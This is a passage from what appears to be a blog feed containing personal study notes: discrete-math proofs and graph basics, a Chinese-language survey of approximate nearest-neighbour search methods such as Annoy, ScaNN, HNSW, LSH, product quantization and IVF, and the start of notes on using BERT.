even integer if <span class="math inline">\(\exists k \inZ\)</span>, such that <span class="math inline">\(n=2k\)</span>.</p><p>n is odd integer if <span class="math inline">\(\exists k \inZ\)</span>, such that <span class="math inline">\(n=2k+1\)</span>.</p></blockquote></li></ul><h4><span id="theorem-1-to-proof">Theorem 1 to proof</span></h4><p>An <span style="color:blue">even</span> integer plus an <span style="color:orange">odd</span> integer is another <span style="color:orange">odd</span> integer.</p><p>Proof</p><blockquote><p>Assumption:</p><p>​ Suppose m is even and n is odd.</p><p>Definitions:</p><p>​ <span class="math inline">\(\exists k_1 \in Z \ and \ \exists k_2\in Z\)</span> , so that <span class="math inline">\(m = 2*k_1\)</span>and <span class="math inline">\(n=2*k_2+1\)</span>.</p><p>Manipulate: Then, <span class="math display">\[\begin{align*}m+n &amp; = 2k_1+2k_2+1 \\&amp; = 2(k_1+k_2) + 1\end{align*}\]</span> Definitions: Thus,</p><p>​ <span class="math inline">\(\exists k_3 \in Z\)</span> so that <span class="math inline">\(m+n=2k_3+1\)</span>.</p><p>Conclusion:</p><p>​ Thus <span class="math inline">\(m+n\)</span> is <span style="color:orange">odd</span>.</p></blockquote><h4><span id="theorem-2-to-proof">Theorem 2 to proof</span></h4><p>An <strong>even integer</strong> times an <strong>eveninteger</strong> is another <strong>even integer</strong>.</p><p>Proof:</p><blockquote><p>Formally stated theorem:</p><p>​ <span class="math inline">\(\forall m,n \in Z\)</span> if m, n areeven, then <span class="math inline">\(mn\)</span> is even.</p><p>Assumption:</p><p>​ Suppose m, n are even.</p><p>Definition:</p><p>​ <span class="math inline">\(\exists k_1, k_2 \in Z\)</span> so that<span class="math inline">\(m = 2k_1, n=2k_2\)</span>.</p><p>Manipulation: <span class="math display">\[\begin{align*}mn &amp; = 2k_1 *2k_2 \\&amp; = 2(2*k_1*k_2)\end{align*}\]</span> Definition:</p><p>​ Let t = <span class="math inline">\(2k_1k_2\)</span>, <span class="math inline">\(t \in Z\)</span>.</p><p>Conclusion:</p><p>​ Thus, <span class="math inline">\(mn\)</span> is<strong>even</strong>.</p></blockquote><h4><span id="proof-by-counterexample">Proof by counterexample</span></h4><p>Aim is prove <span class="math inline">\(P(x) \RightarrowQ(x)\)</span> is false.</p><p>To do that find one <span class="math inline">\(a \in D\)</span>where <span class="math inline">\(P(a) \land \lnot Q(a)\)</span> istrue.</p><h4><span id="proof-by-division-into-class">Proof by division into class</span></h4><p>Divide the theorem into different cases.</p><h4><span id="proof-by-contradiction">Proof by contradiction</span></h4><ol type="1"><li>Suppose <span class="math inline">\(\lnot p\)</span> is true;</li><li>Find a contradiction like 0 = 1;</li><li>Therefore, <span class="math inline">\(p\)</span> is true.</li></ol><blockquote><p><span class="math inline">\(\lnot p \to contradiction\)</span></p><p>therefore, <span class="math inline">\(p\)</span></p></blockquote><h4><span id="proof-by-contrapositive">Proof by contrapositive</span></h4><blockquote><p><span class="math inline">\(p \to q \equiv \lnot q \to \lnotp\)</span></p></blockquote><ol type="1"><li>Goal: prove <span class="math inline">\(P(x) \RightarrowQ(x)\)</span>.</li><li>Instead, prove: <span class="math inline">\(\lnot Q(x) \Rightarrow\lnot P(x)\)</span>.</li></ol><h2><span id="sequence">Sequence</span></h2><p>Def:</p><p>​ A sequence is a function <span class="math inline">\(f: Z^+ \toC\)</span>.</p><blockquote><p>Ex:</p><p>​ <span class="math inline">\(f(k) = (-1)^k(3*k)\)</span></p></blockquote><h2><span id="induction">Induction</span></h2><p>Goal: prove <span class="math inline">\(P(n), \forall n \geqslant1\)</span>.</p><p>Step 1: prove <span class="math inline">\(P(a), P(b),...,P(x)\)</span> is true.</p><p>Step 2: Assume <span class="math inline">\(P(k)\)</span> is true,Prove <span class="math inline">\(P(k+1)\)</span> is true, <span class="math inline">\(x &lt; k\)</span>.</p><h2><span id="skipped-things">Skipped things</span></h2><p>Relations of Sets.</p><p>Permutation and combination.</p><p>Bayes` theorem.</p><p>Markov Chain.</p><h2><span id="graph">Graph</span></h2><p>Def:</p><p>​ A graph (V, E) has a set V called "vertices" and a set E called"edges" that consisting of two-element subsets of V.</p><blockquote><p>Ex:</p><p>​ <span class="math inline">\(V = \{A,B,C,D\}\)</span></p><p>​ <span class="math inline">\(E = \{\{A,B\}, \{B,A\}, \{B,D\},\{D,B\}, \{B,C\}, \{C,D\}, \{A,C\}\}\)</span></p></blockquote><h3><span id="complete-graph">Complete Graph</span></h3><p>Def:</p><p>​ A simple undirected graph in which every pair of distinct verticesis connected by a unique edge. The notation is <span class="math inline">\(K_n\)</span>. The edge number is <span class="math inline">\(\frac {n(n-1)}{2}\)</span>.</p><h3><span id="connected-graph">Connected Graph</span></h3><p>Def:</p><p>​ A graph is connected if you can get from any vertex to any other viaedges.</p><h3><span id="induced-subgraph">Induced Subgraph</span></h3><p>Def:</p><p>​ <span class="math inline">\((V_1, E_1)\)</span> is an inducedsubgraph of <span class="math inline">\((V_2,E_2)\)</span> if it is agraph where <span class="math inline">\(V_1 \subseteq V_2\)</span> and<span class="math inline">\(E_1\)</span> contains all possible edgesconsisting of vertices in <span class="math inline">\(V_1\)</span> and<span class="math inline">\(E_1 \subset E_2\)</span>.</p><h3><span id="degree">Degree</span></h3><p>Def:</p><p>​ The degree of a vertex is the number of edges attached.</p><p>Fact:</p><p>​ Sum of degrees of all vertices is <strong>even</strong>. Cause everyedge adds 2 degrees.</p><blockquote><p>Ex:</p><p>​ Among 5 people, could everyone be friends with exactly 2 people?</p><blockquote><p>The degree is <span class="math inline">\(5 * 2=10\)</span>, it`spossible.</p></blockquote><p>​ Among 5 people, could everyone be friends with exactly 3 people?</p><blockquote><p>The degree is <span class="math inline">\(5 * 3=15\)</span>, it`s notpossible.</p></blockquote></blockquote><h3><span id="euler-path">Euler Path</span></h3><p>Def:</p><p>​ An <strong>Euler Path</strong> walks through a graph <strong>usingevery edge exactly once</strong>.</p><p>​ An <strong>Euler Circuit</strong> starts and stops at the samevertex when walking through a Euler Path.</p><p>Theorem:</p><p>​ If a graph has an Euler Circuit, then every vertex has <strong>evendegree</strong>.</p><p>Contrapositive Theorem:</p><p>​ If a graph has a vertex with odd degree, no Euler Circuit ispossible.</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cs basic </tag>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Embedding &amp; Searching</title>
      <link href="/posts/9e991c30.html"/>
      <url>/posts/9e991c30.html</url>
      
        <content type="html"><![CDATA[<p>相似性搜索常见于以图搜图，听歌识曲...这类抽象查找问题中。你没有明确的Key，不能使用SQL之类的方法查找数据库。但是可以通过抽象的embedding 向量来进行检索。 一般样本向量表示可以通过 Skip-gram withnegative sampling 方法、DSSM 这类方法、BERT这类方法等等。得到向量表达之后，一般还需要高效的召回索引方法，因为暴力匹配在较大数据量场景下，速度通常差强人意。</p><p>这类通过抽象 embedding 的具有语义检索能力的方法，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Embedding & Search_pic/ScaNN tom export.gif" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>一组相关算法的 benchmarks 对比图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Embedding & Search_pic/image-20210905144457729.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><h2><span id="annoy">Annoy</span></h2><p>Spotify音乐公司开源的<a href="https://github.com/spotify/annoy">工具库</a>。</p><p>这是一种基于树的方法。</p><p>算法简单描述：</p><blockquote><p>定义： N -- 树模型的总个数；</p><p>​ K -- 叶节点最大样本数；</p><p>​ M -- 目标Top M样本数；</p><p>​ D -- 联通两个子空间所要求的最大距离；</p><p>过程：</p><p>==建树==</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">for i in (1, ... , <span class="hljs-code">`N`</span>):<br><span class="hljs-bullet">  1. </span>随机选取两个样本点，计算两者中点处超平面，划分两侧样本为两个子树；<br><span class="hljs-bullet">  2. </span>继续划分样本点，直到叶子节点中样本数不大于 <span class="hljs-code">`K`</span>；<br><span class="hljs-bullet">  3. </span>保存二叉树（即保存每个划分点的值）；<br></code></pre></div></td></tr></table></figure><p>==搜索==</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">for j in (1, ... , <span class="hljs-code">`N`</span>):<br><span class="hljs-bullet"> 1. </span>从根节点开始，根据二分节点，向下遍历；<br><span class="hljs-bullet"> 2. </span>if 两个子空间相近（随机选的两个点距离小于 <span class="hljs-code">`D`</span>），同时向两个子节点，向下遍历；<br><span class="hljs-bullet"> 3. </span>保存找到的叶子节点空间（节点集合）；<br><br>聚合<span class="hljs-code">`N`</span>个叶子节点集合，以找到距离目标节点最近的 Top <span class="hljs-code">`M `</span>个样本点；<br>返回结果<br></code></pre></div></td></tr></table></figure></blockquote><p>Annoy利用二叉树的结构对空间进行随机划分，建索引阶段效率有所提升。二叉树结构在检索时效率也很高。</p><p>特点：</p><ol type="1"><li>召回率较优，和暴力搜索法相比较基本一致</li><li>查询速度很快</li><li>千万量级的item，时间为若干小时，尚可以忍受</li><li>千万量级的item，以100棵树为例，索引文件大约几个G，有点大了</li><li>多核利用支持的不是很好</li></ol><h2><span id="scann">ScaNN</span></h2><p>ScaNN是google提出的高效向量检索算法，文中说这个方法比目前已有的其他方法有更高的精度，检索速度也要快两倍。工具库开源地址<a href="https://github.com/google-research/google-research/tree/master/scann">GitHub</a>。</p><p>这种算法主要是优化 Inner product 距离度量下的搜索。这类问题被叫做 <a href="https://papers.nips.cc/paper/5329-asymmetric-lsh-alsh-for-sublinear-time-maximum-inner-product-search-mips.pdf">maximuminner-product search</a>(MIPS)。在大数据量场景下，MIPS的计算复杂度是比较高的，穷举搜索几乎不可能在期望的时间范围内完成。</p><p>论文中，阐述了目前使用的向量压缩（比如聚类或者降维）所使用方法，会使得压缩后的向量间平均距离变小。这可能导致了向量差异性的损失，比如与query向量的内积的相对大小关系会出现错误。比如这样：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Embedding & Search_pic/image-20210905141342414.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>上图中，x 被分别压缩到 c 点，其余 q 的内积大小关系发生颠倒。本来<span class="math inline">\(&lt;q,x_2&gt; greater\ than&lt;q,x_1&gt;\)</span>， 压缩后 <span class="math inline">\(&lt;q,x_1&gt; greater\ than&lt;q,x_2&gt;\)</span>。</p><p>论文中指出，这种方法压缩，只考虑了距离的长度大小，而没有考虑距离的角度方向。</p><p>一个简单的例子，计算两个向量的内积，当一个向量在平行于投影方向（两个向量方向都可作为投影方向）变化k ，内积的变化为 <span class="math inline">\(d_1\)</span>。而如果实在一个向量的垂直方向，变化 k，内积的变化为 <span class="math inline">\(d_2\)</span>。那么，<span class="math inline">\(d_2 ≥ d_1\)</span>一定成立。画个图就能验证。</p><p>所以，现在在压缩时，对于 x 与 c 在平行于 x向量方向上的变化，给予一个大的惩罚项；而对于 x 与 c 在垂直于 x向量方向上的变化，给予一个较小的惩罚项。以此来进行压缩。取了名字叫，<strong>AnisotropicVector Quantization</strong>。</p><p>效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Embedding & Search_pic/image-20210905142905349.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>内积相对大小关系，没有变化。按照论文中的说法，这样做最大化了压缩后各个点之间的平均距离，有利于差异化相似度的值。</p><p>算法大致流程：</p><blockquote><ol type="1"><li>根据样本数量大小，选择是否将数据进行 Partitioning。若Partitioning，在检索时，会先选出 Top m个Partitioning，再进行细化检索。</li><li>Scoring：使用快速的粗粒度的距离度量，计算query相对所有样本（或Partition的样本）的距离。选出Top k 个。</li><li>Rescoring: 对 Top k 个Scoring结果，进行更精确的距离度量，重拍后输出Top k 的结果。</li></ol></blockquote><p>使用 <a href="https://github.com/google-research/google-research/tree/master/scann/docs">doc</a>比较简短，可以参考。</p><h2><span id="hnsw">HNSW</span></h2><p>HNSW是一种图算法。其根据搜索场景的特点，设计出了这种算法。</p><p>首先，简单想想图的搜索，麻烦的问题可能有哪些。可能有孤立的节点，或者可能相邻节点太多。在近邻搜索场景下，可能有几个距离目标很近的节点，但是没有相互连通，那么就需要遍历更多的路径，从而遍历完全这几个节点。</p><p>另外，节点众多时，当两个节点距离相对较远时，遍历数量会指数级增加。</p><p>HNSW的解决方法如下：</p><blockquote><p>定义：</p><p>​ N -- 总样本数；</p><p>​ K -- 每个节点最多有K个相连的近邻节点；</p><p>​ P1 -- 以 P1 的概率将节点设置为二级索引；</p><p>​ P2 -- 以 P2 的概率将节点设置为一级索引（P1 &gt;P2，两者指数递减）；</p><p>​ M -- 目标Top M样本数；</p><p>过程：</p><p>==建图==</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">for</span> <span class="hljs-string">i</span> <span class="hljs-string">in</span> <span class="hljs-string">(1,</span> <span class="hljs-string">...</span> <span class="hljs-string">,</span> <span class="hljs-string">N):</span><br><br><span class="hljs-string">if</span> <span class="hljs-string">(随机概率值</span> <span class="hljs-string">p)</span> <span class="hljs-string">&gt;</span> <span class="hljs-attr">P1:</span> <br><span class="hljs-string">二级索引图插入节点：</span><br><span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">将被插入节点连接指向最近邻的</span> <span class="hljs-string">K</span> <span class="hljs-string">个节点（小于等于</span> <span class="hljs-string">K）；</span><br><span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">更新被连接的</span> <span class="hljs-string">K</span> <span class="hljs-string">个节点（小于等于</span> <span class="hljs-string">K）的最近邻的</span> <span class="hljs-string">K</span> <span class="hljs-string">个节点；</span><br><span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">保证每个节点都有连接，且最大连接不超过</span> <span class="hljs-string">K；</span><br><br><span class="hljs-string">if</span> <span class="hljs-string">(随机概率值</span> <span class="hljs-string">p)</span> <span class="hljs-string">&gt;</span> <span class="hljs-attr">P2:</span><br><span class="hljs-string">一级索引图插入节点：</span><br><span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">将被插入节点连接指向最近邻的</span> <span class="hljs-string">K</span> <span class="hljs-string">个节点（小于等于</span> <span class="hljs-string">K）；</span><br><span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">更新被连接的</span> <span class="hljs-string">K</span> <span class="hljs-string">个节点（小于等于</span> <span class="hljs-string">K）的最近邻的</span> <span class="hljs-string">K</span> <span class="hljs-string">个节点；</span><br><span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">保证每个节点都有连接，且最大连接不超过</span> <span class="hljs-string">K；</span><br><br><span class="hljs-string">全量样本索引图插入节点：</span><br><span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">将被插入节点连接指向最近邻的</span> <span class="hljs-string">K</span> <span class="hljs-string">个节点（小于等于</span> <span class="hljs-string">K）；</span><br><span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">更新被连接的</span> <span class="hljs-string">K</span> <span class="hljs-string">个节点（小于等于</span> <span class="hljs-string">K）的最近邻的</span> <span class="hljs-string">K</span> <span class="hljs-string">个节点；</span><br><span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">保证每个节点都有连接，且最大连接不超过</span> <span class="hljs-string">K；</span><br><br><span class="hljs-string">返回建立的多级索引图</span><br></code></pre></div></td></tr></table></figure><p>==搜索==</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> 在二级索引图中找到最近邻节点 A<br><span class="hljs-number">2.</span> 在一级索引图中从 A 开始找到最近邻节点 B<br><span class="hljs-number">3.</span> 在全量样本索引图中从 B 开始找到 Top M 的目标节点<br></code></pre></div></td></tr></table></figure></blockquote><p>HNSW设计的插入机制，保证了图具有良好的连通性和局部搜索便捷性。类似跳表结构的多级索引机制，提高了搜索效率，降低了整体搜索复杂度。</p><p>算法细节看<a href="https://arxiv.org/abs/1603.09320">文章</a>，这里只是草草写写思想。开源工具库C++版：<a href="https://github.com/nmslib/hnswlib"><em>hnswlib</em></a></p><p>特点：</p><ol type="1"><li>召回率优秀，和暴力搜索基本一致</li><li>千万量级的item，构图可在分钟级别完成</li><li>多核利用优秀</li><li>查询速度很快</li></ol><h2><span id="lsh">LSH</span></h2><p>在 min hash之上，更进一步优化了在大量文本相似性聚类的算法。首先需要计算每一个文本的多个不同min hash 表示，构成 min hash 值向量。然后对 min hash向量分块进行简单的元素对比，检查是否相似。此处LSH，只关注基于 Jaccardsimilarity 的文本处理，其他LSH实现不涉及。</p><p>这就是一种基于词统计的 hash分桶算法。其中没有计算欧式距离这种计算量较大的操作，仅仅是元素对比。</p><p>算法如下：</p><blockquote><p>定义: K -- 取文本中连续 K 个词为bag of words的计数对象（这里被称为K-Shingling）；</p><p>​ N -- min hash向量的维度，即进行随机 min hash 的次数；</p><p>​ M -- 文本总数；</p><p>​ b -- LSH中hash分组的组数；</p><p>​ r -- b组 min hash 子向量的维度；</p><p>过程：</p><p>==min hash==</p><figure class="highlight excel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs excel"><span class="hljs-number">1</span>. 对整个文本集构建以 K 个连续词为一个对象的bag of words统计矩阵，文本中存在的对象标记为<span class="hljs-number">1</span>，不存在标记为<span class="hljs-number">0</span>；<br><span class="hljs-number">2</span>. for i in (<span class="hljs-number">1</span>, ... , <span class="hljs-built_in">N</span>)<span class="hljs-symbol">:</span><br>   A. 随机指定统计矩阵中一个 <span class="hljs-built_in">index</span> 为起始位置（保存<span class="hljs-built_in">index</span>）；<br>   B. 从 <span class="hljs-built_in">index</span> 开始，在每一个文档列中，向下查找第一非 <span class="hljs-number">0</span> 位置；<br>   C. 取第一非 <span class="hljs-number">0</span> 位置与 <span class="hljs-built_in">index</span> 位置的偏移量为 <span class="hljs-built_in">min</span> hash 向量的第 i 行，有 M 个 <span class="hljs-built_in">min</span> hash 向量；<br><span class="hljs-number">3</span>. 得到 (<span class="hljs-built_in">N</span>, M) 的 <span class="hljs-built_in">min</span> hash 矩阵<br></code></pre></div></td></tr></table></figure><p>==局部敏感hash(LSH)==</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>. 将 min hash 矩阵均分为 <span class="hljs-keyword">b </span>组；<br><span class="hljs-number">2</span>. 分桶聚类：<br>   for <span class="hljs-keyword">j </span>in (<span class="hljs-number">1</span>, ..., <span class="hljs-keyword">b):</span><br><span class="hljs-keyword"> </span>     A. 两两对比第 <span class="hljs-keyword">j </span>组 min hash 子向量；<br>      <span class="hljs-keyword">B. </span>子向量完全相同时，将该两个向量对应文本，放到一个相似桶中（类似聚类）；<br><span class="hljs-number">3</span>. 保存分桶结果，每个桶中就是相似的文本<br></code></pre></div></td></tr></table></figure></blockquote><p>关于 min hash，它就是一种 Jaccrad similarity 的另一种表示。</p><p><span class="math inline">\(P(hash(S_i)=hash(S_j))\)</span> 就等价于<span class="math inline">\(Jaccard(S_i,S_j)\)</span>。证明也挺简单的：</p><blockquote><ol type="1"><li><p>只看两个 min hash 向量中不全为 0 的行，记为 <span class="math inline">\(sub\_hash\)</span>。</p></li><li><p>此时 <span class="math inline">\(hash(S_i)=hash(S_j)\)</span>概率就等价于 <span class="math inline">\(sub\_hash\)</span> 的第一行都为1 的概率。</p></li><li><p><span class="math inline">\(sub\_hash\)</span> 的第一行都为 1的概率，就等于<span class="math inline">\(sub\_hash\)</span>中｛两列都为 1 的行数 / 任意一列为 1 的行数｝。</p></li><li><p><span class="math inline">\(sub\_hash\)</span> 中｛两列都为 1的行数 / 任意一列为 1 的行数｝，就是 <span class="math inline">\(Jaccard(S_i, S_j)\)</span>。</p></li></ol></blockquote><p>另外，调整参数 <code>b</code> 和 <code>r</code>可以间接调整分桶的相似性阈值。假设两个 min hash 向量相似概率为 <span class="math inline">\(p\)</span>。分到同一个桶中的概率可表示为（只要有一组sub hash 相同就分到一个桶）： <span class="math display">\[1 - (1 - p^r)^b\]</span> 开源工具库：<a href="https://github.com/mattilyra/LSH">mattilyra/LSH</a></p><p>特点：</p><ol type="1"><li>查找速度快</li><li>方便去重处理</li><li>处理大量数据速度较快</li></ol><h2><span id="product-quantizer">Product Quantizer</span></h2><p>ProductQuantizer简称为PQ，是一种建立索引的方法。优化了K-Means聚类的计算量。</p><blockquote><p>定义：</p><p>​ N -- 样本总量； ​ D -- embedding维度； ​ K -- 子空间数量； ​ C --K-means聚类类别数；</p><p>过程：</p><p>==建索引==</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> 将 N 个 D 维embedding，切分为 K 组 (N, D/K) 的embedding；<br><span class="hljs-number">2.</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>, ..., K):<br>   A. 对第 i 个 (N, D/K)的embedding，计算 C 个聚类中心点<br><span class="hljs-number">3.</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>, ..., N):<br>   <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>, ..., K):<br>      A. 将第 j 个样本标记到第 k 组聚类的所属中心点编号；<br>      B. 循环得到第 j 个样本的 K 维中心点编号向量；<br>   得到 (N, K) 的样本编码矩阵<br></code></pre></div></td></tr></table></figure><p>==搜索==</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>. 将输入 embedding 划分为 K 组 <span class="hljs-keyword">sub </span>embedding；<br><span class="hljs-number">2</span>. for i in (<span class="hljs-number">1</span>, ..., K):<br>   for <span class="hljs-keyword">j </span>in (<span class="hljs-number">1</span>, ..., C):<br>      A. 计算 <span class="hljs-keyword">sub </span>embedding 与聚类中心 <span class="hljs-keyword">j </span>的距离；<br>      <span class="hljs-keyword">B. </span>循环得到 C 维的距离向量；<br>   循环得到 (K, C) 的距离矩阵<br><span class="hljs-number">3</span>. 计算输入与所有样本的距离： <br>   for i in (<span class="hljs-number">1</span>, ..., N):<br>      取 (N, K) 的样本编码矩阵中第 i 行 (<span class="hljs-number">1</span>, K), 记为 Q;<br>      定义输入与样本 i 的距离为 <span class="hljs-keyword">di；</span><br><span class="hljs-keyword"></span>   for k in (<span class="hljs-number">1</span>, ..., K):<br>           A. 取 Q[k] 的值，记为 q；<br>           <span class="hljs-keyword">B. </span>取 (K, C) 的距离矩阵中第 k 行，记为 <span class="hljs-keyword">dist；</span><br><span class="hljs-keyword"> </span>          C. <span class="hljs-keyword">di </span>+= <span class="hljs-keyword">dist[q];</span><br><span class="hljs-keyword"> </span>     记录输入与样本 i 的距离为 <span class="hljs-keyword">di </span>的值；<br><span class="hljs-number">4</span>. 从 N 个 <span class="hljs-keyword">di </span>距离中找到需要的样本   <br></code></pre></div></td></tr></table></figure></blockquote><p>这种方法，将暴力搜索，转化为 K * N 次距离表查找过程。</p><h2><span id="inverted-file-system">Inverted File System</span></h2><p>这个方法（简称 IVF）相当于使用倒排表来优化索引。比如 IVF + PQ，来优化K * N 次的查询操作。IVF， PQ 在 <a href="https://github.com/search?q=faiss">Faiss</a> 库中都有实现。</p><p>简述一下方法：</p><p>在 PQ 建立索引的过程中增加一步：</p><blockquote><p>将 (N, K) 的样本，分别保存到 <code>C_ivf</code>个聚类之下，即，保存到<code>C_ivf</code>个代表一个类的数组中。得到 <code>C_ivf</code>个类别字典，key 为聚类中心点（id），value 为该聚类中所有样本点的 PQ编码数组。（按照 <code>C_ivf</code>个聚类类别进行倒排样本）</p></blockquote><p>在 PQ 查询中增加一步：</p><blockquote><p>在第三步第二层 for 循环中，先求得与输入样本最近的 <code>C_ivf</code>聚类中心，然后在该聚类的 PQ 编码数组中计算每个样本与输入的距离。</p></blockquote><p>利用倒排，减少了搜索范围。从全部样本搜索，变成先找聚类，再在类中搜索。</p><p>这里建立倒排的 K-means 聚类与 PQ 中使用的不同，使用一个更粗粒度的K-means 聚类，但是没有对 N 个 embedding 进行划分。</p><p>显然，IVF虽然建立索引的过程更复杂一些，但是搜索的过程会更快速。</p><h2><span id="structure-basedapproximations">Structure-basedApproximations</span></h2><p>这类近似搜索，将搜索过程抽象为一个神经网络表示的函数，输入对象，输出搜索结果。当然以下方法需要监督数据支持，或者可以构建无监督的共现关系。</p><ul><li><p>Negative sampling softmax:</p><p>简化版的NCE近似计算，将多分类，转为多个正负例二分类。复杂的负例分布抽样时，可以采用importancesampling进行简化。</p></li><li><p>Class-based softmax:</p><p>使用两个softmax，第一个预测 class，第二个基于输入和 class预测搜索目标。</p></li><li><p>Hierarchical softmax：</p><p>构建 Huffmantree，然后每个节点只进行一个二值分类预测，直到叶子节点。预测直接变成了tree height 次二分类计算。</p></li><li><p>Binary code prediction：</p><p>将所有对象的index，转化为二进制表示，使用多个sigmoid，预测每个位置是0 还是 1，得到目标index的二进制表示。</p></li><li><p>Embedding Prediction：</p><p>预测 embedding 表示。这个方法是对 Embedding inference模型的近似，思路基本上和蒸馏差不多。对于下游搜索匹配，没有影响。这个方法用到一种损失，Von-MisesFisher distributionloss，约束了输出embedding靠近一个单位球面（超球面）。</p></li></ul><h2><span id="end">End</span></h2><p>相似性搜索，和计算 margin loss 的分类问题目标比较接近。 <span class="math display">\[Loss_{margin}(x,y,\hat{y})=max(0, 1+s(\hat{y}|x)-s(y|x))\]</span> 另外，基于树的搜索，还有KD Tree算法，这里不涉及。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> searching </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Practical BERT</title>
      <link href="/posts/372ecc5c.html"/>
      <url>/posts/372ecc5c.html</url>
      
        <content type="html"><![CDATA[<p>BERT类模型，基本使用流程：1. Further pretrain. 2. single-task ormulti-task finetuning. 3. inference</p><p>Further pretraining一般使用任务数据进行，也可以使用与任务数据相似的in-domain数据，或者使用数据量更大但是和任务数据不那么相关的数据进行。</p><p>一般而言使用任务数据的效果会好一些。但是数据量不足，且能找到与任务数据相似的in-domain 数据，也可以稳定提高模型效果。（<a href="https://arxiv.org/pdf/1905.05583.pdf">ref</a>）</p><h2><span id="transformer-representations">Transformer Representations</span></h2><p>Transformer不同的层捕获不同层次的表示。比如、下层是表层（字、词）特征，中层是句法特征，上层是语义特征。</p><p>如图为不同的embedding表示，输入BiLSTM进行NER任务的结果对比。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210720225102337.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>BERT的不同层编码的信息非常不同，因此适当的池化策略，应该根据不同应用而改变，因为不同的层编码不同的信息。</p><p>Hugging Face的BERT模型一般输出为：</p><ul><li><strong>last hidden state</strong> (batch size, seq len, hiddensize) which is the sequence of hidden states at the output of the lastlayer.</li><li><strong>pooler output</strong> (batch size, hidden size) - Lastlayer hidden-state of the first token of the sequence</li><li><strong>hidden states</strong> (n layers, batch size, seq len,hidden size) - Hidden states for all layers and for all ids.</li></ul><h3><span id="pooler-output">Pooler output</span></h3><p>pooler output，最后一层的[CLS] token的hidden state，接一个Linearlayer 和一个 Tanh activation function的结果。预训练时，作为next 